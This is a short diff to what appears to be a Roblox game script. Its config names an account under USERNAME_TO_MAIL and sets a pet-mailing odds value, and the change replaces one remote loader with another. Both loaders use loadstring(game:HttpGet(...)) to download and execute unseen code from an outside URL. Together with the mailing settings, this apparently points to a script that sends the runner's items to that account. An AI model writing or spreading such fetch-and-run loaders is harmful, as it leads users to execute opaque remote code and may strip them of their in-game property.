@@ -13,5 +13,4 @@ EVENT_EGG = true,
     MAIL_PET_ODDS = 1000000,  
     USERNAME_TO_MAIL = "petfastziinn01" 
 }
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HOHOHUB7/VPS/refs/heads/main/pets-go-teck.lua"))()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/e81ea00ef49a917bb1242da4f41dc4f9.lua"))()
